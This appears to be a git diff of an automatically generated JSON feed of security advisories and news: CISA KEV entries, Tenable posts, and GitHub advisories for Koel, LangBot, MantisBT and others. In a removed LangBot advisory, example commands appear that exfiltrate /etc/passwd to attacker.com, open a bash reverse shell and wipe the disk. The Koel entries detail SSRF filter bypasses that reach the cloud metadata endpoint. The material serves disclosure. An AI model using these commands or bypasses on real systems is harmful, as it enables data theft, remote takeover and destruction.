@@ -1,10 +1,67 @@
 {
-  "generated": "2026-07-16T13:14:06.485438+00:00",
-  "total": 39,
-  "kev": 0,
-  "zero_day": 20,
+  "generated": "2026-07-16T18:53:11.307596+00:00",
+  "total": 30,
+  "kev": 3,
+  "zero_day": 18,
   "enriched": 0,
   "findings": [
+    {
+      "id": "CVE-2026-58644",
+      "title": "CVE-2026-58644 \u2014 Microsoft SharePoint Deserialization of Untrusted Data Vulnerability",
+      "summary": "Vendor: Microsoft | Product: SharePoint. Microsoft SharePoint contains a deserialization of untrusted data vulnerability that allows an unauthorized attacker to execute code over a network. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-07-19)",
+      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-58644",
+      "published": "2026-07-16",
+      "source": "CISA KEV",
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited"
+      ],
+      "cve_ids": [
+        "CVE-2026-58644"
+      ],
+      "is_kev": true,
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
+      "id": "CVE-2026-25089",
+      "title": "CVE-2026-25089 \u2014 Fortinet FortiSandbox OS Command Injection Vulnerability",
+      "summary": "Vendor: Fortinet | Product: FortiSandbox. Fortinet FortiSandbox, FortiSandbox Cloud, and FortiSandbox PaaS contain an OS command injection vulnerability that allows an unauthenticated attacker to execute unauthorized commands via specifically crafted HTTP requests. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-07-19)",
+      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-25089",
+      "published": "2026-07-16",
+      "source": "CISA KEV",
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited"
+      ],
+      "cve_ids": [
+        "CVE-2026-25089"
+      ],
+      "is_kev": true,
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
+      "id": "CVE-2026-39808",
+      "title": "CVE-2026-39808 \u2014 Fortinet FortiSandbox OS Command Injection Vulnerability",
+      "summary": "Vendor: Fortinet | Product: FortiSandbox. Fortinet FortiSandbox contains an OS command injection vulnerability that could allow an unauthenticated attacker to execute unauthorized code or commands via crafted HTTP requests. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-07-19)",
+      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-39808",
+      "published": "2026-07-16",
+      "source": "CISA KEV",
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited"
+      ],
+      "cve_ids": [
+        "CVE-2026-39808"
+      ],
+      "is_kev": true,
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
     {
       "id": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-194a",
       "title": "Improve Router Hygiene to Protect Against Russian State-Sponsored Targeting",
@@ -38,6 +95,28 @@
       "is_high_severity": true
     },
     {
+      "id": "https://www.tenable.com/blog/cve-2026-32201-cve-2026-45659-cve-2026-56164-faq-sharepoint-server-exploitation",
+      "title": "CVE-2026-32201, CVE-2026-45659, CVE-2026-56164: Frequently Asked Questions About Active Exploitation of Microsoft SharePoint Server Vulnerabilities",
+      "summary": "Four Microsoft SharePoint Server vulnerabilities are under active exploitation, prompting CISA to issue a hardening alert. An additional high-severity flaw recently patched adds pressure for organizations running on-premises deployments. Key Takeaways CISA confirmed active exploitation of three on-premises SharePoint Server vulnerabilities (CVE-2026-32201, CVE-2026-45659, CVE-2026-56164), used to gain unauthorized access, establish remote code execution, steal IIS machine keys and deploy malware for persistence. Two additional SharePoint Server vulnerabilities disclosed on July 14, 2026, CVE-2026-55040 and CVE-2026-58644, were not yet observed exploited at the time of publication, but Microsoft has flagged CVE-2026-58644 as exploited on July 15. Microsoft released patches for all five vulnerabilities and Microsoft Defender Antivirus detection signatures are available to identify exploitation activity for three of the actively exploited flaws. Background Tenable's Research Special Operations (RSO) team has compiled this blog to answer Frequently Asked Questions (FAQ) regarding active exploitation of Microsoft SharePoint Server vulnerabilities. FAQ When did CISA issue an alert about SharePoint Server exploitation? On July 14, 2026, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) published an alert confirming active exploitation of three on-premises SharePoint Server vulnerabilities: CVE-2026-32201, CVE-2026-45659, and CVE-2026-56164. The alert noted that these flaws had been used to gain unauthorized access to SharePoint deployments across all supported on-premises versions and flagged two additional high-risk vulnerabilities, CVE-2026-55040 and CVE-2026-58644, as not yet exploited but warranting immediate patching. However in an update to the security advisory on July 15, Microsoft confirmed CVE-2026-58644 has been exploited in the wild. What vulnerabilities are covered in this alert? Five Microsoft SharePoint Server vulnerabilities are covered in CI",
+      "link": "https://www.tenable.com/blog/cve-2026-32201-cve-2026-45659-cve-2026-56164-faq-sharepoint-server-exploitation",
+      "published": "2026-07-16T16:00:26+00:00",
+      "source": "Tenable Security Research",
+      "tags": [
+        "cloud",
+        "research",
+        "vuln"
+      ],
+      "cve_ids": [
+        "CVE-2026-32201",
+        "CVE-2026-45659",
+        "CVE-2026-56164",
+        "CVE-2026-55040",
+        "CVE-2026-58644"
+      ],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
       "id": "https://www.bleepingcomputer.com/news/security/cisa-orders-feds-to-patch-actively-exploited-oracle-flaw-by-saturday/",
       "title": "CISA orders feds to patch actively exploited Oracle flaw by Saturday",
       "summary": "CISA has ordered federal agencies to secure their systems by Saturday against ongoing attacks exploiting a critical vulnerability in the Oracle E-Business Suite financial application. [...]",
@@ -62,40 +141,6 @@
       "tags": [
         "news",
         "zeroday"
-      ],
-      "cve_ids": [],
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "https://www.tenable.com/blog/cve-2026-15409-cve-2026-15410-sonicwall-sma-1000-zero-day-vulnerabilities-exploited-in-the",
-      "title": "CVE-2026-15409, CVE-2026-15410: SonicWall SMA 1000 zero-day vulnerabilities exploited in the wild",
-      "summary": "SonicWall patched two recently exploited zero-day vulnerabilities in its SMA 1000 Series secure remote access appliances which may have been chained for unauthenticated remote code execution. Key takeaways CVE-2026-15409 and CVE-2026-15410 are a pair of exploited vulnerabilities that may have been chained together to allow for code execution on SonicWall SMA1000 series appliances. Zero-day exploitation of these vulnerabilities has been observed and confirmed by SonicWall. Patches and indicators of compromise are available and urgent patching is recommended. Background SonicWall's Secure Mobile Access (SMA) 1000 Series appliances are enterprise-grade SSL VPN gateways which serve as the front door to organizational networks. The SMA series models sit at the edge of the network, internet-facing by design. Because SMA 1000 appliances aggregate remote access credentials and sit directly on the internet, they represent high-value targets for attackers. A compromise at the appliance level can yield administrator credentials, VPN session tokens, and detailed knowledge of the internal network architecture sitting behind the gateway. On July 14, SonicWall disclosed two vulnerabilities that are being exploited together in the wild: CVE Description CVSSv3 CVE-2026-15409 SonicWall SMA 1000 server-side request forgery (SSRF) vulnerability 10 CVE-2026-15410 SonicWall SMA 1000 remote code execution vulnerability (RCE) 7.2 While the advisory does not specify if they were exploited in tandem, together they form a fully remote, unauthenticated path to arbitrary OS command execution on affected appliances. Analysis CVE-2026-15409 is a SSRF vulnerability affecting the SMA 1000 Workplace interface. This flaw allows a remote, unauthenticated attacker to make network requests to locations of the attacker's choosing. In practice, SSRF on an internet-facing appliance can serve as a pivot, allowing an attacker to probe internal services, relay authentication material, or reach the AMC in a wa",
-      "link": "https://www.tenable.com/blog/cve-2026-15409-cve-2026-15410-sonicwall-sma-1000-zero-day-vulnerabilities-exploited-in-the",
-      "published": "2026-07-15T17:14:09+00:00",
-      "source": "Tenable Security Research",
-      "tags": [
-        "cloud",
-        "research",
-        "vuln"
-      ],
-      "cve_ids": [
-        "CVE-2026-15409",
-        "CVE-2026-15410"
-      ],
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "https://www.securityweek.com/unpatched-cursor-vulnerability-exposes-users-to-code-execution/",
-      "title": "Unpatched Cursor Vulnerability Exposes Users to Code Execution",
-      "summary": "An attacker can create a malicious repository containing a git.exe in the project root, and Cursor executes it automatically. The post Unpatched Cursor Vulnerability Exposes Users to Code Execution appeared first on SecurityWeek .",
-      "link": "https://www.securityweek.com/unpatched-cursor-vulnerability-exposes-users-to-code-execution/",
-      "published": "2026-07-15T14:37:13+00:00",
-      "source": "SecurityWeek",
-      "tags": [
-        "news",
-        "research"
       ],
       "cve_ids": [],
       "is_zero_day": true,
@@ -306,21 +351,6 @@
       "is_high_severity": false
     },
     {
-      "id": "https://www.bleepingcomputer.com/news/security/we-built-a-vulnerability-vending-machine-ai-tokens-in-zero-days-out/",
-      "title": "We built a vulnerability vending machine: AI tokens in, zero-days out",
-      "summary": "Intruder built an AI-powered \"vulnerability vending machine\" that combines code slicing with LLMs to automatically discover complex software vulnerabilities. The company explains how the system found and exploited a previously unknown WordPress plugin zero-day, with additional discoveries already under responsible disclosure. [...]",
-      "link": "https://www.bleepingcomputer.com/news/security/we-built-a-vulnerability-vending-machine-ai-tokens-in-zero-days-out/",
-      "published": "2026-07-15T14:01:11+00:00",
-      "source": "Bleeping Computer",
-      "tags": [
-        "news",
-        "malware"
-      ],
-      "cve_ids": [],
-      "is_zero_day": true,
-      "is_high_severity": false
-    },
-    {
       "id": "https://thehackernews.com/2026/07/zoom-patches-critical-windows-flaw-that.html",
       "title": "Zoom Patches Critical Windows Flaw That Could Enable Account Takeover",
       "summary": "Zoom has released security updates for a critical security flaw impacting Zoom Workplace for Windows that could facilitate account takeover.\n\nThe vulnerability, tracked as CVE-2026-53412 (CVSS score: 9.8), affects Zoom Desktop Client for Windows, Zoom VDI Client for Windows, and Zoom Meeting SDK for Windows.\n\n\"Improper Input Validation in Zoom Desktop Client for Windows, Zoom VDI Client for",
@@ -459,186 +489,6 @@
       ],
       "cve_ids": [
         "CVE-2026-54450"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54494",
-      "title": "Koel: Full-read SSRF via podcast enclosure URL: isPublicHost() filter_var guard does not reject NAT64 (64:ff9b::/96) or 6to4 (2002::/16) IPv6-transition wrappers of internal IPv4",
-      "summary": "## Summary\n\nKoel's outbound-URL guard `App\\Helpers\\Network::isPublicHost()` classifies an IP as \"public\" using PHP's `filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)`. That flag set does **not** recognise IPv6 transition-address forms that embed a private/loopback/link-local IPv4: NAT64 well-known prefix `64:ff9b::/96` (RFC 6052) and 6to4 `2002::/16` (RFC 3056). An address such as `64:ff9b::7f00:1` (= `127.0.0.1`), `64:ff9b::a9fe:a9fe` (= `169.254.169.254`, the cloud metadata endpoint), or `2002:a00:1::` (= `10.0.0.1`) is reported as a public address, so the guard returns `true` and Koel proceeds to fetch the URL.\n\nThe guard is the only SSRF defense in front of `App\\Values\\Podcast\\EpisodePlayable::createForEpisode()`, which downloads a podcast episode with `Http::sink($file)->get($url)` and streams the response body back to the requesting user. Because an attacker fully controls the `<enclosure url>` of any RSS feed they host (and any authenticated user can subscribe to a feed), they can publish an enclosure whose hostname has an `AAAA` record that is a NAT64/6to4 wrapper of an internal IP. On hosts with NAT64 or 6to4/dual-stack routing (the standard configuration on IPv6-only AWS/GCP subnets and 6to4-relayed networks), the kernel routes the wrapper to the embedded IPv4, and Koel performs a full-read SSRF against the internal endpoint \u2014 returning the response body to the attacker.\n\nThis is a server-side request forgery with full response disclosure (CWE-918) against internal services and cloud instance metadata.\n\n## Vulnerable code\n\n`app/Helpers/Network.php` \u2014 `isPublicHost()` (the literal-IP branch and the per-resolved-record branch use the identical predicate):\n\n```php\npublic function isPublicHost(string $host): bool\n{\n    if (filter_var($host, FILTER_VALIDATE_IP)) {\n        return (\n            filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false\n        );\n    }\n\n    try {",
-      "link": "https://github.com/advisories/GHSA-rjg7-r26h-cfp2",
-      "published": "2026-07-15T18:21:39Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54494"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-50552",
-      "title": "Koel: Server-Side Request Forgery (SSRF) in radio station creation due to missing validation bail",
-      "summary": "Summary\n\nKoel v9.5.0 contains a Server-Side Request Forgery (SSRF) vulnerability in the radio station creation endpoint (POST /api/radio/stations). The url field validation rules are declared without the bail keyword, so the HasAudioContentType rule \u2014 which issues HTTP requests to the supplied URL \u2014 still executes even after the SafeUrl rule has rejected the URL as pointing to a private/reserved address. Any authenticated, non-admin user can therefore coerce the server into making HEAD/GET requests to arbitrary internal hosts.\n\nThis is a blind SSRF: the response body is never returned to the client, but the two distinct validation error messages form a reliable internal-network reachability oracle.\n\nSeverity\n\nMedium \u2014 CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N (5.4)\n\nAuthenticated (low-privilege) actor; blind SSRF (no response-body exfiltration). Confidentiality (L) reflects the internal reachability oracle; Integrity (L) reflects state-changing internal endpoints that act on GET/HEAD.\n\nAffected Component\n\n- Version: Koel v9.5.0 (latest release, HEAD b2e9a34, verified 2026-05-30)\n- Endpoint: POST /api/radio/stations\n- Files:\n  - app/Http/Requests/API/Radio/RadioStationStoreRequest.php (missing bail)\n  - app/Rules/HasAudioContentType.php (unguarded HTTP fetch)\n\nRoot Cause\n\napp/Http/Requests/API/Radio/RadioStationStoreRequest.php (lines 25-34):\n\n    'url' => [\n        'required',\n        'url',\n        Rule::unique('radio_stations')->where(function ($query) {\n            return $query->where('user_id', $this->user()->id);\n        }),\n        new SafeUrl(),\n        new HasAudioContentType(),\n    ],\n\nIn Laravel, validation rules within a single attribute run in sequence and do not stop on the first failure unless bail is present or FormRequest::$stopOnFirstFailure is set. Neither is the case here (App\\Http\\Requests\\Request does not override stopOnFirstFailure, and authorize() simply returns true).\n\nFor a directly-supplied private/reserved address (e.g. http://169.254.",
-      "link": "https://github.com/advisories/GHSA-jr4p-4xjh-fwvw",
-      "published": "2026-07-15T18:21:04Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-50552"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54491",
-      "title": "Koel: Incomplete fix for CVE-2026-47260 \u2014 systemic SSRF in podcast & radio fetch paths",
-      "summary": "### Summary\n\nThe fix for **CVE-2026-47260** (v9.3.5) added an **initial** `isSafeUrl()` check to several fetchers (`synchronizeEpisodes`, `getStreamableUrl`, `AddRadioStation`, `EpisodePlayable`), but the **redirect-target validation** \u2014 the per-hop Guzzle `on_redirect` callback added in follow-up commit `be1e867` \u2014 was applied to **only one** path, `EpisodePlayable`. Every other server-side fetcher therefore has **only the initial check, which an HTTP 302 redirect to an internal address bypasses**, or no check at all. **DNS rebinding** (validation and connection resolve DNS separately, with no IP pinning) bypasses the initial check on every path.\n\nAn **authenticated, non-admin** user can thus cause the Koel server to issue requests to arbitrary internal / cloud-metadata endpoints (SSRF) by supplying a URL on an attacker-controlled host that 302-redirects to an internal address.\n\n> Note: commit `be1e867` shows the redirect-based SSRF vector was recognised, but the redirect defense was applied to a single call site rather than generalised \u2014 so the class survives in the sibling paths below.\n\n### Details \u2014 Root cause\n\n`App\\Helpers\\Network::isPublicHost()` / `isSafeUrl()` perform a **point-in-time host check** with no pinning of the resolved IP, and **per-redirect-hop** re-validation exists **only** in `App\\Values\\Podcast\\EpisodePlayable` (the `on_redirect` callback from commit `be1e867`). Consequently every other fetcher is exposed to (1) **redirect SSRF** \u2014 initial URL passes `isSafeUrl`, then the HTTP client follows a cross-host 302 to an internal target without re-validating the hop; and (2) **DNS rebinding (TOCTOU)** \u2014 `isPublicHost` resolves DNS at validation, the HTTP client resolves again at connect time.\n\n### Affected paths (all reachable by any authenticated user)\n\n| # | Location | Issue |\n|---|----------|-------|\n| 1 | `PhanAn\\Poddle\\Poddle::fromUrl()` \u2192 `Http::timeout()->get($url)` (used by `PodcastService::addPodcast`/`refreshPodcast`) | Plain `Http::get`, ",
-      "link": "https://github.com/advisories/GHSA-6qvr-wjmv-v8mm",
-      "published": "2026-07-15T17:59:30Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54491"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54449",
-      "title": "LangBot: Authenticated RCE Via MCP Configuration",
-      "summary": "### Summary\nAny authenticated user can achieve arbitrary command execution on the LangBot servers through changing the MCP Server Configuration by added an \"STDIO\" MCP with an arbitrary command.\n\n### Details\nThe repository uses StdioServerParameters which is based on Anthropic's modelcontextprotocol open source, inside the code - src/langbot/pkg/provider/tools/loaders/mcp.py - StdioServerParameters is imported from mcp, which executes a given command which runs a subprocess on the target machine.\n\nSince the LangBot services are authenticated, an attacker finding an open server needs to sign up or login via stolen credentials, then the attacker can use the MCP configuration to enter any arbitrary command, giving the ability to completely take over the machine.\n\n### PoC\n1. Open the LangBot server\n2. Navigate to Extensions\n3. Open the \"MCP\" tab and press \"Add\"\n4. Choose an STDIO server configuration\n5. Add any arbitrary command with arguments\n<img width=\"480\" height=\"538\" alt=\"Screenshot 2026-01-19 at 15 08 43\" src=\"https://github.com/user-attachments/assets/c341afa8-68c0-4c34-b5b6-ad8796184bdd\" />\n\nNote that an attacker could use this configuration to enter any arbitrary command, including data exfiltration (cat /etc/passwd | nc attacker.com 4444), opening a reverse shell (bash -i >& /dev/tcp/10.0.0.1/8080 0>&1), potentially removing the whole machine's data (rm -rf / --no-preserve-root), and many more.\n\n### Impact\nThis is an authenticated remote code execution vulnerability (RCE), affecting any publicly available LangBot instance, and local instances when in the same network as the attacker (Lateral Movement).\nCWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection').\n\n### Video POC\nhttps://github.com/user-attachments/assets/4868d232-7453-442c-bffd-60f0ad4679ea\n\n### Resources\nhttps://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/\nhttps://www.ox.security/blog/mcp-",
-      "link": "https://github.com/advisories/GHSA-3pvh-63gf-j9mw",
-      "published": "2026-07-15T17:39:34Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54449"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54447",
-      "title": "garminconnect Has Insecure Permission Assignment for Garmin OAuth Token Store",
-      "summary": "## Insecure Permission Assignment for Garmin OAuth Token Store\n\n### Summary\n\n`garminconnect` (\u2264 0.3.4) wrote its OAuth token store to disk without restricting file-system permissions. Under the default Linux umask (`022`) the token file `garmin_tokens.json` was created world-readable (`0o644`). The file contains the DI **refresh token**, so any other local user on a shared host could read it and obtain persistent, unauthorized access to the victim's Garmin Connect account.\n\n- **Severity:** High\n- **Weakness:** CWE-732 (Incorrect Permission Assignment for Critical Resource)\n- **Affected versions:** `<= 0.3.4`\n- **Patched version:** `0.3.5`\n\n### Details\n\n`Client.dump()` created the token directory and file with no `mode` argument, leaving permissions entirely to the process umask:\n\n```python\ndef dump(self, path: str) -> None:\n    p = Path(path).expanduser()\n    if p.is_dir() or not p.name.endswith(\".json\"):\n        p = p / \"garmin_tokens.json\"\n    p.parent.mkdir(parents=True, exist_ok=True)   # no mode=\n    p.write_text(self.dumps())                     # no permission restriction\n```\n\nThe serialized payload includes `di_token`, `di_refresh_token`, and `di_client_id`. The call is in the core library (`Garmin.login(tokenstore=...)` persists tokens this way), and all shipped usage examples default the token store to `~/.garminconnect`.\n\nUnder `umask 022` the resulting permissions were:\n\n- token directory \u2192 `0o755`\n- `garmin_tokens.json` \u2192 `0o644` (world-readable)\n\nA separate, unprivileged user on the same machine could read the file with a plain `open()` \u2014 no elevated privileges required \u2014 and extract the refresh token.\n\n### Impact\n\nLocal credential theft / privilege escalation on multi-user Linux or macOS hosts running under a permissive umask. The stolen refresh token can be exchanged for fresh access tokens via Garmin's OAuth endpoint, granting ongoing access to the victim's account (health/fitness data, activity history, device management) until the token is revoked",
-      "link": "https://github.com/advisories/GHSA-wjhr-76vg-2hvc",
-      "published": "2026-07-15T17:33:00Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54447"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54493",
-      "title": "Koel: Authenticated Full-Read SSRF via Subsonic Internet Radio Stations",
-      "summary": "### Summary\nKoel v9.6.0 validates radio station URLs on the regular web API, but the Subsonic-compatible radio endpoints do not apply the same SSRF protections. An authenticated user can create or update a radio station with a private URL and then use Koel's radio streaming feature to make the server fetch that URL and return the upstream response body.\n\nThis was validated against v9.6.0 (352ea5ec27fa22294da8fb6beacb3d5552f0d09c) using the official phanan/koel:9.6.0 image.\n\n### Details\n#### SafeUrl is applied on the web API, but not on the Subsonic endpoints\n\nKoel's regular radio API protects station URLs with `SafeUrl` and `HasAudioContentType`:\n\n- `app/Http/Requests/API/Radio/RadioStationStoreRequest.php`\n- `app/Http/Requests/API/Radio/RadioStationUpdateRequest.php`\n\n```php\nnew SafeUrl(),\nnew HasAudioContentType(),\n```\n\nThe Subsonic-compatible routes do not reuse those checks:\n\n- `routes/subsonic.php`\n  - `createInternetRadioStation.view`\n  - `updateInternetRadioStation.view`\n- `app/Http/Requests/Subsonic/CreateInternetRadioStationRequest.php`\n- `app/Http/Requests/Subsonic/UpdateInternetRadioStationRequest.php`\n\n```php\nreturn [\n    'streamUrl' => ['required', 'string'],\n    'name' => ['required', 'string'],\n    'homepageUrl' => ['nullable', 'string'],\n];\n```\n\nThe result is a validation gap between two routes that create the same type of object.\n\n#### The unvalidated URL is stored and later fetched server-side\n\nThe Subsonic controllers hand the supplied URL to the regular radio service without any SSRF validation:\n\n- `app/Http/Controllers/Subsonic/CreateInternetRadioStationController.php`\n- `app/Http/Controllers/Subsonic/UpdateInternetRadioStationController.php`\n- `app/Services/RadioService.php`\n\nThe SSRF is triggered when the station is played:\n\n- `app/Http/Controllers/StreamRadioController.php`\n- `app/Services/Radio/RadioStreamService.php`\n- `app/Services/Radio/RadioStreamProxy.php`\n\n`RadioStreamProxy::openStream()` opens a web address supplied by the attacker (a",
-      "link": "https://github.com/advisories/GHSA-6p96-cfg5-4vhp",
-      "published": "2026-07-15T17:13:23Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54493"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54492",
-      "title": "Koel: Authenticated Blind SSRF via Subsonic Podcast Channel Creation",
-      "summary": "### Summary\nKoel `v9.6.0` protects the regular podcast subscription API with `SafeUrl`, but the Subsonic-compatible `createPodcastChannel.view` route does not apply the same protection. An authenticated user can supply a private URL and cause Koel to fetch it server-side during podcast parsing.\n\nThis was validated against `v9.6.0` (`352ea5ec27fa22294da8fb6beacb3d5552f0d09c`) using the official `phanan/koel:9.6.0` image.\n\nThis is distinct from `GHSA-7j2f-6h2r-6cqc`, which fixed unsafe episode enclosure URLs in versions `<= 9.3.4`. The issue here is a newer validation gap in the Subsonic route itself, still present in `v9.6.0`.\n\n### Details\n#### SafeUrl protects the regular podcast API only\n\nThe regular podcast subscription path validates the feed URL with `SafeUrl`:\n\n- `app/Http/Requests/API/Podcast/PodcastStoreRequest.php`\n\n```php\nreturn [\n    'url' => ['required', 'url', new SafeUrl()],\n];\n```\n\nThe Subsonic-compatible route does not:\n\n- `routes/subsonic.php`\n  - `createPodcastChannel.view`\n- `app/Http/Requests/Subsonic/CreatePodcastChannelRequest.php`\n\n```php\nreturn [\n    'url' => ['required', 'string', 'url'],\n];\n```\n\nThat creates the same kind of trust-boundary mismatch as the radio issue: the main API rejects private targets, while the compatibility route accepts them.\n\n#### The URL is fetched immediately by the podcast parser\n\nThe attacker-controlled URL is used by the podcast service during channel creation:\n\n- `app/Http/Controllers/Subsonic/CreatePodcastChannelController.php`\n- `app/Services/Podcast/PodcastService.php`\n\n`PodcastService::addPodcast()` calls:\n\n```php\n$parser = $this->createParser($url);\n```\n\nand `createParser()` resolves to:\n\n```php\nreturn Poddle::fromUrl($url, 5 * 60, $this->client);\n```\n\nThis means the SSRF happens as part of the channel creation flow itself. No separate playback step is needed.\n\n#### This bypasses Koel's intended SSRF control for podcast URLs\n\nKoel already added `SafeUrl` to the regular podcast API and has already published ",
-      "link": "https://github.com/advisories/GHSA-w79m-f3jx-779v",
-      "published": "2026-07-15T17:07:16Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54492"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-49273",
-      "title": "MantisBT: Remote Code Execution via eval() Class Hoisting in adm_config_set.php",
-      "summary": "MantisBT 2.28.3 and earlier contains a remote code execution vulnerability in the admin \"Manage Configuration\" feature (adm_config_set.php). When setting a configuration value with a non-string type (integer, float, complex), the value is passed through ConfigParser -> Tokenizer, which calls *eval()* with a `return;` prefix intended to prevent code execution.\n\nHowever, PHP hoists function and class declarations at compile time, even past a *return* statement. An attacker can define a class in the eval()'d code that hijacks a class loaded later via PHP's autoloader, achieving arbitrary code execution.\n\nThis vulnerability requires administrator access to the web UI (adm_config_set.php). The REST API's ConfigsSetCommand does NOT use Tokenizer/eval() and is not affected.\n\n### Impact\n- Remote code execution as the web server user (www-data) from an authenticated administrator session\n\n### Patches\n- https://github.com/mantisbt/mantisbt/commit/78c0af63d1fe0118004744cab21ca3bf2cea0f5c\n\n### Workarounds\nNone. \n\n### Resources\n- https://mantisbt.org/bugs/view.php?id=37122\n\n### Credits\nMcCaulay Hudson (@_McCaulay) of watchTowr",
-      "link": "https://github.com/advisories/GHSA-v84x-qvhg-f36r",
-      "published": "2026-07-15T16:52:24Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-49273"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-47156",
-      "title": "MantisBT: SOAP API Authentication Bypass with Privilege Escalation to Administrator",
-      "summary": "MantisBT 2.28.3 and earlier contains a critical authentication bypass in the SOAP API's mci_check_login() function. Any user knowing any valid cookie_string can authenticate as any other user (knowing their username), including the administrator, without knowing the target's password.\n\nThe vulnerability is exploitable with zero prior access on default MantisBT installations because self-registration is enabled by default ($g_allow_signup = ON). A self-registered user can use their own cookie_string (readable from their browser's MANTIS_STRING_COOKIE cookie after login) to impersonate the administrator via the SOAP API.\n\nThe REST API is NOT affected. The REST API's AuthMiddleware derives the username server-side from the API token or session cookie, so the username cannot be spoofed.\n\nThe Web UI is NOT affected. The Web UI authenticates via PHP session cookies (PHPSESSID) and validates the MANTIS_STRING_COOKIE against the logged-in user through auth_is_cookie_valid(). The username is derived server-side from the cookie, not supplied by the client.\n\n### Impact\n- Full administrator access to the SOAP API from zero prior access (with self-registration enabled, which is the default)\n- Read/write all issues including private issues and notes across all projects\n- Full data exfiltration of all bug reports, attachments, user accounts (id, name, email), and non-private configuration values via the 71 SOAP operations available\n- Destructive operations: delete projects, issues, attachments, tags, categories, and versions\n- Data manipulation: create/modify issues, impersonate reporters, manage project structure\n- Chains with other vulnerabilities: the SOAP admin access enables exploitation of SOAP vulnerabilities that require administrator privileges\n\n### Patches\n- https://github.com/mantisbt/mantisbt/commit/e3571c319b1721b41b0dc4b5b5203cbdcbe0c2ee\n\n### Workarounds\nNone\n\n### Resources\n- https://mantisbt.org/bugs/view.php?id=37121\n\n### Credits\nMantisBT would like to thank McCaul",
-      "link": "https://github.com/advisories/GHSA-c2xg-qjqw-2v98",
-      "published": "2026-07-15T16:45:22Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47156"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "https://thehackernews.com/2026/07/firefox-chrome-adobe-and-vmware-updates.html",
-      "title": "Firefox, Chrome, Adobe, and VMware Updates Fix Multiple Critical Security Flaws",
